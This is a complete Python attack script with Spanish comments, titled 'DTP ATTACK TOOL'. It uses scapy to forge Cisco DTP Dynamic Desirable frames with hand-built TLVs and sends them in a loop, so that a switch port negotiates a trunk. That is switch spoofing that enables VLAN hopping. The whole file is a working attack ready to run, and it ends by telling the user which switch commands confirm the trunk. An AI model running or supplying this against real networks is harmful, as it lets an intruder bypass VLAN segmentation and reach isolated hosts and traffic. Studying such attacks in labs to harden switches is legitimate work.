#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DTP ATTACK TOOL - Switch Spoofing / VLAN Hopping
Fuerza negociación de trunk enviando tramas DTP Dynamic Desirable.
"""

import sys
import os
import time
import argparse

if os.geteuid() != 0:
    print("\n[!] Requiere root: sudo python3 DTP_Attack.py\n")
    sys.exit(1)

try:
    from scapy.all import conf, sendp, get_if_hwaddr, Dot3, LLC, SNAP, Raw
    conf.verb = 0
except ImportError:
    print("\n[!] Instala scapy: pip install scapy\n")
    sys.exit(1)

def parse_args():
    p = argparse.ArgumentParser(description="DTP VLAN Hopping - Switch Spoofing")
    p.add_argument("-i", "--interface", required=True, help="Interfaz de red (ej. eth0)")
    p.add_argument("-m", "--mac",       default=None,  help="MAC de origen (omitir = auto-detectar)")
    p.add_argument("-c", "--count",     type=int, default=0,
                   help="Cantidad de tramas a enviar (0 = infinito, default: 0)")
    p.add_argument("-s", "--sleep",     type=float, default=1.0,
                   help="Segundos entre tramas (default: 1)")
    return p.parse_args()

def build_dtp_frame(src_mac):
    """
    Construye una trama DTP Dynamic Desirable manualmente.

    Estructura del payload DTP:
      VER  = 0x01  (DTP version 1)
      TLVs:
        Type 0x0001  Domain   (valor: \x00 = dominio vacío / any)
        Type 0x0002  Status   (0x03 = Dynamic Desirable)
        Type 0x0003  DTP Type (0xa5 = 802.1Q)
        Type 0x0004  Neighbor (MAC del atacante)
    """

    def tlv(t, v):
        # TLV: Type (2B) + Length (2B, incluye los 4 bytes del header) + Value
        length = 4 + len(v)
        return t.to_bytes(2, 'big') + length.to_bytes(2, 'big') + v

    mac_bytes = bytes(int(x, 16) for x in src_mac.split(':'))

    dtp_payload = (
        b'\x01' +                        # DTP Version
        tlv(0x0001, b'\x00') +           # Domain  (vacío = acepta cualquier dominio)
        tlv(0x0002, b'\x03') +           # Status  = Dynamic Desirable
        tlv(0x0003, b'\xa5') +           # DTP Type= 802.1Q
        tlv(0x0004, mac_bytes)           # Neighbor MAC
    )

    frame = (
        Dot3(dst="01:00:0c:cc:cc:cc", src=src_mac) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=0x00000c, code=0x2004) /   # 0x2004 = DTP
        Raw(load=dtp_payload)
    )
    return frame

def main():
    args = parse_args()

    src_mac = args.mac if args.mac else get_if_hwaddr(args.interface)
    print(f"\n[*] Interfaz  : {args.interface}")
    print(f"[*] MAC origen: {src_mac}")
    print(f"[*] Modo      : {'infinito' if args.count == 0 else str(args.count) + ' tramas'}")
    print(f"[*] Intervalo : {args.sleep}s\n")

    frame = build_dtp_frame(src_mac)

    print("[*] Enviando tramas DTP Dynamic Desirable...")
    print("    (El switch debería negociar trunk en ~3-5 tramas)")
    print("    Presiona Ctrl+C para detener\n")

    sent  = 0
    try:
        while True:
            sendp(frame, iface=args.interface, verbose=False)
            sent += 1
            print(f"[+] Trama #{sent} enviada — esperando negociacion trunk...")

            if args.count > 0 and sent >= args.count:
                break
            time.sleep(args.sleep)

    except KeyboardInterrupt:
        print(f"\n[*] Detenido por el usuario. Tramas enviadas: {sent}")

    print("\n[*] Verifica en el switch:")
    print("      show interfaces trunk")
    print("      show interfaces <iface> switchport\n")

if __name__ == "__main__":
    main()
